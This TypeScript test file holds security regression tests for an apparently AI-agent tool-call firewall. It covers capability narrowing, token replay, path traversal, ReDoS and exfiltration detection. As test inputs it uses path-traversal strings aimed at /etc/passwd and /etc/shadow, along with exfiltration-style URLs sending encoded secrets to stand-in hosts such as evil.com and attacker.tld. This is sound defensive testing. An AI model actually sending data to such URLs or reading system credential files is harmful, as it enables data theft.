/**
 * Security regression tests covering each vulnerability class
 * identified in the security verification analysis.
 *
 * These tests exist to prevent regressions on fixes for:
 *   1. Constraint intersection narrowing
 *   2. Token double-spend (TOCTOU)
 *   3. Path traversal and symlink protection
 *   4. ReDoS bounded evaluation
 *   5. Database constraint bypass
 *   6. Policy regex failure (fail closed)
 *   7. Rate limiting (server-level, tested via unit)
 *   8. Auth failure handling
 */

import { ToolCallDeniedError } from "@arikernel/core";
import { matchesRule } from "@arikernel/policy-engine";
import { afterEach, describe, expect, it } from "vitest";
import { createFirewall } from "../../src/index.js";
import { createSecretPatternFilter } from "../../src/output-filter.js";
import { canonicalizePath, isPathAllowed } from "../../src/path-security.js";
import { isSuspiciousGetExfil } from "../../src/run-state.js";
import { TokenStore } from "../../src/token-store.js";
import { containsDangerousUnicode, normalizeInput } from "../../src/unicode-safety.js";

// ── 1. Constraint intersection narrowing ────────────────────────────────────

describe("constraint intersection: narrowing invariant", () => {
	afterEach(() => {});

	// biome-ignore lint/suspicious/noExplicitAny: test helper accepts varied capability shapes
	function makeFirewall(capabilities: any[]) {
		return createFirewall({
			principal: { name: "test", capabilities },
			policies: [
				{ id: "allow-all", name: "Allow", priority: 100, match: {}, decision: "allow" as const },
			],
			auditLog: ":memory:",
		});
	}

	it("request cannot broaden past base: disjoint sets produce empty result", () => {
		const fw = makeFirewall([
			{ toolClass: "http", actions: ["get"], constraints: { allowedHosts: ["good.com"] } },
		]);
		const d = fw.requestCapability("http.read", {
			constraints: { allowedHosts: ["evil.com"] },
		});
		expect(d.granted).toBe(true);
		expect(d.grant?.constraints.allowedHosts).toEqual([]);
		fw.close();
	});

	it("omitting request constraint inherits base constraint", () => {
		const fw = makeFirewall([
			{ toolClass: "http", actions: ["get"], constraints: { allowedHosts: ["good.com"] } },
		]);
		const d = fw.requestCapability("http.read");
		expect(d.granted).toBe(true);
		expect(d.grant?.constraints.allowedHosts).toEqual(["good.com"]);
		fw.close();
	});

	it("request wildcard is narrowed to base values", () => {
		const fw = makeFirewall([
			{ toolClass: "http", actions: ["get"], constraints: { allowedHosts: ["good.com"] } },
		]);
		const d = fw.requestCapability("http.read", {
			constraints: { allowedHosts: ["*"] },
		});
		expect(d.granted).toBe(true);
		expect(d.grant?.constraints.allowedHosts).toEqual(["good.com"]);
		fw.close();
	});

	it("base wildcard allows request values through (minus wildcard)", () => {
		const fw = makeFirewall([
			{ toolClass: "http", actions: ["get"], constraints: { allowedHosts: ["*"] } },
		]);
		const d = fw.requestCapability("http.read", {
			constraints: { allowedHosts: ["*", "evil.com"] },
		});
		expect(d.granted).toBe(true);
		expect(d.grant?.constraints.allowedHosts).toEqual(["evil.com"]);
		fw.close();
	});
});

// ── 2. Token double-spend (TOCTOU race) ─────────────────────────────────────

describe("token store: atomic consume prevents double-spend", () => {
	it("consume() with maxCalls=1 — second call returns invalid", () => {
		const store = new TokenStore();
		store.store({
			id: "grant-1",
			requestId: "req-1",
			principalId: "agent",
			capabilityClass: "http.read",
			constraints: {},
			lease: {
				issuedAt: new Date().toISOString(),
				expiresAt: new Date(Date.now() + 60_000).toISOString(),
				maxCalls: 1,
				callsUsed: 0,
			},
			taintContext: [],
			revoked: false,
		});

		const first = store.consume("grant-1");
		expect(first.valid).toBe(true);

		const second = store.consume("grant-1");
		expect(second.valid).toBe(false);
		expect(second.reason).toContain("exhausted");
	});

	it("consume() rejects expired grants", () => {
		const store = new TokenStore();
		store.store({
			id: "grant-expired",
			requestId: "req-1",
			principalId: "agent",
			capabilityClass: "http.read",
			constraints: {},
			lease: {
				issuedAt: new Date(Date.now() - 120_000).toISOString(),
				expiresAt: new Date(Date.now() - 60_000).toISOString(),
				maxCalls: 10,
				callsUsed: 0,
			},
			taintContext: [],
			revoked: false,
		});

		const result = store.consume("grant-expired");
		expect(result.valid).toBe(false);
		expect(result.reason).toContain("expired");
	});

	it("consume() rejects revoked grants", () => {
		const store = new TokenStore();
		store.store({
			id: "grant-revoked",
			requestId: "req-1",
			principalId: "agent",
			capabilityClass: "http.read",
			constraints: {},
			lease: {
				issuedAt: new Date().toISOString(),
				expiresAt: new Date(Date.now() + 60_000).toISOString(),
				maxCalls: 10,
				callsUsed: 0,
			},
			taintContext: [],
			revoked: false,
		});

		store.revoke("grant-revoked");
		const result = store.consume("grant-revoked");
		expect(result.valid).toBe(false);
		expect(result.reason).toContain("revoked");
	});

	it("consume() rejects nonexistent grant ID", () => {
		const store = new TokenStore();
		const result = store.consume("does-not-exist");
		expect(result.valid).toBe(false);
		expect(result.reason).toContain("not found");
	});
});

// ── 3. Path traversal and symlink protection ────────────────────────────────

describe("path traversal protection", () => {
	it("../ traversal escaping allowed directory is blocked", () => {
		const { allowed } = isPathAllowed("./data/../../etc/passwd", ["./data/**"], "/project");
		expect(allowed).toBe(false);
	});

	it("absolute path outside jail is blocked", () => {
		const { allowed } = isPathAllowed("/etc/shadow", ["./data/**"], "/project");
		expect(allowed).toBe(false);
	});

	it("canonicalizePath collapses ../ sequences", () => {
		const result = canonicalizePath("./data/../../../etc/passwd", "/project");
		expect(result).not.toContain("..");
	});

	it("prefix-sharing paths are not confused for subdirectories", () => {
		const { allowed } = isPathAllowed("./data-secret/key", ["./data/**"], "/project");
		expect(allowed).toBe(false);
	});

	it("~ expansion resolves to home directory", () => {
		const result = canonicalizePath("~/file.txt");
		const home = process.env.HOME ?? process.env.USERPROFILE ?? "/";
		expect(result).toContain("file.txt");
		// Should not literally contain the tilde
		expect(result).not.toMatch(/^~\//);
	});
});

// ── 4. ReDoS bounded evaluation ─────────────────────────────────────────────

describe("output filter: bounded regex prevents ReDoS", () => {
	it("processes a 10KB string of repeated characters in <100ms", () => {
		const filter = createSecretPatternFilter();
		const tc = {
			id: "tc-1",
			runId: "run-1",
			sequence: 0,
			timestamp: new Date().toISOString(),
			principalId: "test",
			toolClass: "http",
			action: "get",
			parameters: {},
			taintLabels: [],
		};
		const bigInput = "A".repeat(10_000);
		const result = {
			callId: "tc-1",
			success: true,
			data: bigInput,
			taintLabels: [],
			durationMs: 1,
		};

		const start = performance.now();
		filter(tc, result);
		const elapsed = performance.now() - start;

		expect(elapsed).toBeLessThan(100);
	});

	it("processes a 50KB string without hanging", () => {
		const filter = createSecretPatternFilter();
		const tc = {
			id: "tc-1",
			runId: "run-1",
			sequence: 0,
			timestamp: new Date().toISOString(),
			principalId: "test",
			toolClass: "http",
			action: "get",
			parameters: {},
			taintLabels: [],
		};
		const bigInput = "x".repeat(50_000);
		const result = {
			callId: "tc-1",
			success: true,
			data: bigInput,
			taintLabels: [],
			durationMs: 1,
		};

		const start = performance.now();
		filter(tc, result);
		const elapsed = performance.now() - start;

		expect(elapsed).toBeLessThan(500);
	});
});

// ── 5. Database constraint bypass ───────────────────────────────────────────

describe("database constraint: substring bypass prevention", () => {
	function makeFirewall(allowedDatabases: string[]) {
		return createFirewall({
			principal: {
				name: "test",
				capabilities: [
					{
						toolClass: "database",
						actions: ["query"],
						constraints: { allowedDatabases },
					},
				],
			},
			policies: [
				{
					id: "allow-db",
					name: "Allow DB",
					priority: 100,
					match: { toolClass: "database" as const },
					decision: "allow" as const,
				},
			],
			auditLog: ":memory:",
		});
	}

	it("blocks query mentioning 'prodstaging' when only 'prod' is allowed", async () => {
		const fw = makeFirewall(["prod"]);

		fw.registerExecutor({
			toolClass: "database",
			async execute(toolCall) {
				return {
					callId: toolCall.id,
					success: true,
					data: [],
					durationMs: 1,
					taintLabels: [],
				};
			},
		});

		const grant = fw.requestCapability("database.read");
		expect(grant.granted).toBe(true);

		// "prodstaging" should NOT match word-boundary constraint for "prod"
		await expect(
			fw.execute({
				toolClass: "database",
				action: "query",
				parameters: { query: "SELECT * FROM prodstaging.users", database: "prodstaging" },
				grantId: grant.grant?.id,
			}),
		).rejects.toThrow(ToolCallDeniedError);

		fw.close();
	});

	it("allows query with exact database name match", async () => {
		const fw = makeFirewall(["prod"]);

		fw.registerExecutor({
			toolClass: "database",
			async execute(toolCall) {
				return {
					callId: toolCall.id,
					success: true,
					data: [{ id: 1 }],
					durationMs: 1,
					taintLabels: [],
				};
			},
		});

		const grant = fw.requestCapability("database.read");
		expect(grant.granted).toBe(true);

		const result = await fw.execute({
			toolClass: "database",
			action: "query",
			parameters: { query: "SELECT * FROM prod.users", database: "prod" },
			grantId: grant.grant?.id,
		});
		expect(result.success).toBe(true);

		fw.close();
	});
});

// ── 6. Policy regex: fail closed ────────────────────────────────────────────

describe("policy regex safety: fail closed on invalid or slow regex", () => {
	it("invalid regex in policy match fails closed (returns false or throws UnsafeMatchError)", () => {
		const tc = {
			id: "tc-1",
			runId: "run-1",
			sequence: 0,
			timestamp: new Date().toISOString(),
			principalId: "agent",
			toolClass: "http",
			action: "get",
			parameters: { url: "https://example.com" },
			taintLabels: [],
		};

		// Invalid regex pattern with unbalanced parenthesis.
		// The policy engine may either return false (soft fail-closed) or
		// throw UnsafeMatchError (hard fail-closed). Both are safe behaviors —
		// the key property is that it never returns true.
		try {
			const result = matchesRule({ parameters: { url: { pattern: "(((unclosed" } } }, tc, []);
			expect(result).toBe(false);
		} catch (err) {
			expect((err as Error).name).toBe("UnsafeMatchError");
		}
	});

	it("valid regex that matches returns true", () => {
		const tc = {
			id: "tc-1",
			runId: "run-1",
			sequence: 0,
			timestamp: new Date().toISOString(),
			principalId: "agent",
			toolClass: "http",
			action: "get",
			parameters: { url: "https://evil.com/steal" },
			taintLabels: [],
		};

		const result = matchesRule({ parameters: { url: { pattern: "evil\\.com" } } }, tc, []);
		expect(result).toBe(true);
	});

	it("valid regex that does not match returns false", () => {
		const tc = {
			id: "tc-1",
			runId: "run-1",
			sequence: 0,
			timestamp: new Date().toISOString(),
			principalId: "agent",
			toolClass: "http",
			action: "get",
			parameters: { url: "https://good.com/page" },
			taintLabels: [],
		};

		const result = matchesRule({ parameters: { url: { pattern: "evil\\.com" } } }, tc, []);
		expect(result).toBe(false);
	});
});

// ── 7. Rate limiting unit test ──────────────────────────────────────────────

describe("rate limiting logic", () => {
	it("allows requests under the limit and blocks when exceeded", () => {
		// Simulate the rate limiter logic from apps/server
		const RATE_WINDOW_MS = 60_000;
		const RATE_MAX = 3;
		const hits = new Map<string, { count: number; resetAt: number }>();

		function rateOk(ip: string): boolean {
			const now = Date.now();
			let entry = hits.get(ip);
			if (!entry || now >= entry.resetAt) {
				entry = { count: 1, resetAt: now + RATE_WINDOW_MS };
				hits.set(ip, entry);
				return true;
			}
			entry.count++;
			return entry.count <= RATE_MAX;
		}

		expect(rateOk("1.2.3.4")).toBe(true);
		expect(rateOk("1.2.3.4")).toBe(true);
		expect(rateOk("1.2.3.4")).toBe(true);
		// 4th request exceeds limit of 3
		expect(rateOk("1.2.3.4")).toBe(false);

		// Different IP is independent
		expect(rateOk("5.6.7.8")).toBe(true);
	});
});

// ── 8. Auth failure handling ────────────────────────────────────────────────

describe("auth: timing-safe comparison", () => {
	// Port of timingSafeEqual from apps/server/src/main.ts
	function timingSafeEqual(a: string, b: string): boolean {
		if (a.length !== b.length) {
			let result = a.length ^ b.length;
			for (let i = 0; i < a.length; i++) {
				result |= a.charCodeAt(i) ^ (b.charCodeAt(i % b.length) || 0);
			}
			return result === 0;
		}
		let result = 0;
		for (let i = 0; i < a.length; i++) {
			result |= a.charCodeAt(i) ^ b.charCodeAt(i);
		}
		return result === 0;
	}

	it("returns true for matching strings", () => {
		expect(timingSafeEqual("secret-token-123", "secret-token-123")).toBe(true);
	});

	it("returns false for wrong token", () => {
		expect(timingSafeEqual("secret-token-123", "wrong-token-456")).toBe(false);
	});

	it("returns false for different length strings", () => {
		expect(timingSafeEqual("short", "much-longer-string")).toBe(false);
	});

	it("returns false for empty vs non-empty", () => {
		expect(timingSafeEqual("", "token")).toBe(false);
	});

	it("returns true for empty vs empty", () => {
		expect(timingSafeEqual("", "")).toBe(true);
	});

	it("returns false for single character difference", () => {
		expect(timingSafeEqual("abcdef", "abcdeg")).toBe(false);
	});
});

// ── 9. Same grantId used twice (token replay / maxCalls semantics) ──────────

describe("token replay: same grantId used twice with maxCalls > 1", () => {
	it("allows two uses when maxCalls=10", () => {
		const store = new TokenStore();
		store.store({
			id: "grant-multi",
			requestId: "req-1",
			principalId: "agent",
			capabilityClass: "http.read",
			constraints: {},
			lease: {
				issuedAt: new Date().toISOString(),
				expiresAt: new Date(Date.now() + 60_000).toISOString(),
				maxCalls: 10,
				callsUsed: 0,
			},
			taintContext: [],
			revoked: false,
			nonce: "nonce-multi-use",
		});

		const first = store.consume("grant-multi");
		expect(first.valid).toBe(true);

		const second = store.consume("grant-multi");
		expect(second.valid).toBe(true);

		// Verify callsUsed incremented
		const grant = store.get("grant-multi");
		expect(grant?.lease.callsUsed).toBe(2);
	});
});

// ── 10. GET path-segment exfiltration detection ─────────────────────────────

describe("GET exfil: path segment entropy detection", () => {
	it("flags base64-encoded data in URL path segment", () => {
		// Simulates: GET https://attacker.tld/leak/<base64(secret)>
		const encoded = Buffer.from(
			"This is a secret SSH private key content that is long enough",
		).toString("base64");
		expect(isSuspiciousGetExfil(`https://attacker.tld/leak/${encoded}`)).toBe(true);
	});

	it("does not flag normal short path segments", () => {
		expect(isSuspiciousGetExfil("https://example.com/api/v1/users")).toBe(false);
	});

	it("does not flag normal page URLs", () => {
		expect(isSuspiciousGetExfil("https://docs.example.com/guide/getting-started")).toBe(false);
	});

	it("still flags long query strings", () => {
		const longQuery = `data=${"A".repeat(300)}`;
		expect(isSuspiciousGetExfil(`https://example.com/api?${longQuery}`)).toBe(true);
	});

	it("flags long high-entropy path segment", () => {
		// Mixed alphanumeric resembling an API key or encoded payload
		const payload = "aK9xQ2mF7bR4wL1nT6zJ3pY8vC5hG0dE9sU2iO4qW7eX1rA6tM3nB8jV5kZ0yH";
		expect(isSuspiciousGetExfil(`https://evil.com/exfil/${payload}`)).toBe(true);
	});
});

// ── 11. Unicode normalization strips ALL dangerous characters ───────────────

describe("unicode normalization: global stripping", () => {
	it("strips multiple zero-width characters, not just the first", () => {
		const input = "he\u200Bll\u200Bo\u200B";
		const normalized = normalizeInput(input);
		expect(normalized).toBe("hello");
		expect(normalized).not.toContain("\u200B");
	});

	it("strips mixed dangerous characters across the string", () => {
		const input = "\u200Bpath\u200C/to\u200D/file\uFEFF";
		const normalized = normalizeInput(input);
		expect(normalized).toBe("path/to/file");
	});

	it("containsDangerousUnicode correctly detects on repeated calls", () => {
		// Regression: with global flag on test regex, lastIndex would alternate
		expect(containsDangerousUnicode("hello\u200Bworld")).toBe(true);
		expect(containsDangerousUnicode("hello\u200Bworld")).toBe(true); // must be true again
		expect(containsDangerousUnicode("clean")).toBe(false);
		expect(containsDangerousUnicode("clean")).toBe(false); // must be false again
	});
});
